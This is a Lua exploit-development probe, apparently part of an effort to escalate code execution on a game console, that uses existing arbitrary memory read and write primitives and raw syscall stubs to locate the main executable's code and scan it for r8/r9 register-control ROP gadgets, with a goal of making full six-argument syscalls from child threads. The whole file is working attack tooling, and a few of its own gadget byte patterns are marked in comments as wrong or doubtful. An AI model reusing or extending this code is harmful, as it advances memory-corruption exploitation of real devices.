-- CRASH_CLASS: LOW
-- PROBE 386a: scan eboot for r8/r9 control gadgets
--
-- 272a found no pop_r8_ret or pop_r9_ret. But we need r8=0 for sysctl
-- read-only from child thread. Scan for:
--   mov r8, rax; ret  (49 89 C0 C3) — set r8 from controlled rax
--   xor r8d, r8d; ret (45 31 C0 C3) — zero r8
--   mov r8, rdi; ret  (49 89 F8 C3) — set r8 from controlled rdi
--   mov r8, rsi; ret  (49 89 F0 C3) — set r8 from controlled rsi
--   mov r8, rdx; ret  (49 89 D0 C3) — set r8 from controlled rdx
--   Same patterns for r9 (C1 instead of C0, C9/F9/F1/D1)
--   Also: mov r8, 0; ... too long, skip
--   Also: xchg r8, rax (49 90 C3) probably doesn't exist

print("=== PROBE 386a: r8/r9 gadget scan ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- eboot base + text size
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local tlo = rd(N(ib) + 0x108) or 0
local thi = rd(N(ib) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
local szlo = rd(N(ib) + 0x110) or 0
if szlo < 0 then szlo = szlo + 0x100000000 end
local text_size = szlo
if text_size == 0 then text_size = 0x494000 end
if text_size > 0x800000 then text_size = 0x800000 end

local base = thi * 0x100000000 + tlo
print(string.format("eboot=0x%X%08X  size=0x%X (%.1f MB)", thi, tlo, text_size, text_size / 1048576))

-- 4-byte patterns to scan: {bytes_as_dword, name}
-- x86-64 little-endian: bytes[3]<<24 | bytes[2]<<16 | bytes[1]<<8 | bytes[0]
local patterns = {
    -- mov r8, <reg>; ret — REX.WB=49, opcode=89, modrm varies
    {0xC389C049, "mov_r8_rax_ret"},    -- 49 89 C0 C3: mov r8, rax; ret
    {0xC389C849, "mov_r8_rcx_ret"},    -- 49 89 C8 C3: mov r8, rcx; ret
    {0xC389D049, "mov_r8_rdx_ret"},    -- 49 89 D0 C3: mov r8, rdx; ret
    {0xC389F049, "mov_r8_rsi_ret"},    -- 49 89 F0 C3: mov r8, rsi; ret
    {0xC389F849, "mov_r8_rdi_ret"},    -- 49 89 F8 C3: mov r8, rdi; ret

    -- mov r9, <reg>; ret
    {0xC389C149, "mov_r9_rax_ret"},    -- 49 89 C1 C3: mov r9, rax; ret
    {0xC389C949, "mov_r9_rcx_ret"},    -- 49 89 C9 C3: mov r9, rcx; ret
    {0xC389D149, "mov_r9_rdx_ret"},    -- 49 89 D1 C3: mov r9, rdx; ret
    {0xC389F149, "mov_r9_rsi_ret"},    -- 49 89 F1 C3: mov r9, rsi; ret
    {0xC389F949, "mov_r9_rdi_ret"},    -- 49 89 F9 C3: mov r9, rdi; ret

    -- xor r8d, r8d; ret
    {0xC331C045, "xor_r8d_r8d_ret"},   -- 45 31 C0 C3

    -- xor r9d, r9d; ret
    {0xC331C945, "xor_r9d_r9d_ret"},   -- 45 31 C9 C3

    -- mov r8, [rdi]; ret — read from controlled pointer
    {0xC38B4749, "mov_r8_mrdi_ret"},   -- 49 8B 47 00... no, that's wrong
    -- Actually: 4C 8B 07 C3 = mov r8, [rdi]; ret
    {0xC3078B4C, "mov_r8_qw_rdi_ret"}, -- 4C 8B 07 C3

    -- mov r9, [rdi]; ret
    {0xC30F8B4C, "mov_r9_qw_rdi_ret"}, -- 4C 8B 0F C3

    -- Also check: mov r8d, eax; ret (shorter, 32-bit)
    {0xC389C041, "mov_r8d_eax_ret"},   -- 41 89 C0 C3
    {0xC389C141, "mov_r9d_eax_ret"},   -- 41 89 C1 C3

    -- push rax; pop r8; ret (50 41 58 C3)
    {0xC3584150, "push_rax_pop_r8_ret"},

    -- push 0; pop r8; ... unlikely
    -- xchg rax, r8; ret (49 90 C3) — 3 bytes
    -- Actually xchg rax, r8 = 49 90? No, XCHG r8, rax = 4C 87 C0? Or 49 90?
    -- 49 90 = REX.WB + NOP? No.
    -- XCHG rax, r8 is: 4C 87 C0 (not C3 at the end)
    -- Let's include 4C 87 C0 C3
    {0xC3C0874C, "xchg_r8_rax_ret"},
}

print(string.format("[A] scanning %d patterns across %d bytes...", #patterns, text_size))

-- Scan: read each dword, compare against all patterns
local found = {}
local chunks_done = 0
local report_interval = 256 * 1024  -- report every 256K

for off = 0, text_size - 4, 4 do
    if not alive() then print("DEAD"); break end

    local addr = base + off
    local dw = rd(addr)
    if dw then
        if dw < 0 then dw = dw + 0x100000000 end
        for _, p in ipairs(patterns) do
            if dw == p[1] then
                if not found[p[2]] then found[p[2]] = {} end
                local list = found[p[2]]
                if #list < 5 then
                    list[#list + 1] = off
                end
            end
        end
    end

    -- Also check at byte offsets +1, +2, +3 within each dword
    -- We need to check unaligned positions since gadgets can start anywhere
    -- Read next dword too for cross-boundary patterns
    if off + 4 < text_size then
        local dw2 = rd(addr + 4)
        if dw and dw2 then
            if dw < 0 then dw = dw + 0x100000000 end
            if dw2 < 0 then dw2 = dw2 + 0x100000000 end

            -- Check offset +1: bytes [1..4] = dw>>8 | (dw2 & 0xFF)<<24
            local at1 = math.floor(dw / 256) + (dw2 % 256) * 16777216
            -- Check offset +2: bytes [2..5]
            local at2 = math.floor(dw / 65536) + (dw2 % 65536) * 65536
            -- Check offset +3: bytes [3..6]
            local at3 = math.floor(dw / 16777216) + (dw2 % 16777216) * 256

            for _, p in ipairs(patterns) do
                if at1 == p[1] then
                    if not found[p[2]] then found[p[2]] = {} end
                    local list = found[p[2]]
                    if #list < 5 then list[#list + 1] = off + 1 end
                end
                if at2 == p[1] then
                    if not found[p[2]] then found[p[2]] = {} end
                    local list = found[p[2]]
                    if #list < 5 then list[#list + 1] = off + 2 end
                end
                if at3 == p[1] then
                    if not found[p[2]] then found[p[2]] = {} end
                    local list = found[p[2]]
                    if #list < 5 then list[#list + 1] = off + 3 end
                end
            end
        end
    end

    chunks_done = chunks_done + 4
    if chunks_done % report_interval == 0 then
        collectgarbage("collect")
        print(string.format("  %.0f%% (%d / %d)", chunks_done / text_size * 100, chunks_done, text_size))
    end
end

-- [B] Results
print("")
print("[B] RESULTS:")
print("")

local any_found = false
local sorted = {}
for name, list in pairs(found) do
    sorted[#sorted + 1] = {name = name, offsets = list}
    any_found = true
end
table.sort(sorted, function(a, b) return a.name < b.name end)

for _, entry in ipairs(sorted) do
    local offs = {}
    for _, o in ipairs(entry.offsets) do
        offs[#offs + 1] = string.format("+0x%X", o)
    end
    print(string.format("  %-28s count=%d  %s", entry.name, #entry.offsets, table.concat(offs, ", ")))
end

if not any_found then
    print("  NO r8/r9 control gadgets found in eboot .text")
    print("  Child threads limited to 4-arg syscalls")
end

-- [C] Assessment
print("")
print("[C] ASSESSMENT:")
local has_r8 = found["mov_r8_rax_ret"] or found["xor_r8d_r8d_ret"] or
               found["mov_r8_rdi_ret"] or found["mov_r8_rsi_ret"] or
               found["mov_r8_rdx_ret"] or found["mov_r8d_eax_ret"] or
               found["push_rax_pop_r8_ret"] or found["mov_r8_qw_rdi_ret"] or
               found["xchg_r8_rax_ret"]
local has_r9 = found["mov_r9_rax_ret"] or found["xor_r9d_r9d_ret"] or
               found["mov_r9_rdi_ret"] or found["mov_r9_rsi_ret"] or
               found["mov_r9_rdx_ret"] or found["mov_r9d_eax_ret"] or
               found["mov_r9_qw_rdi_ret"]

print(string.format("  r8 control: %s", has_r8 and "YES" or "NO"))
print(string.format("  r9 control: %s", has_r9 and "YES" or "NO"))

if has_r8 and has_r9 then
    print("  *** FULL 6-ARG CAPABILITY FROM CHILD THREAD ***")
elseif has_r8 then
    print("  r8 only — sysctl read (newp=0) possible, 5-arg max")
elseif has_r9 then
    print("  r9 only — limited benefit without r8")
else
    print("  neither — child threads stuck at 4-arg max")
    print("  sysctl must use main thread make_syscall")
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 386a COMPLETE ===")
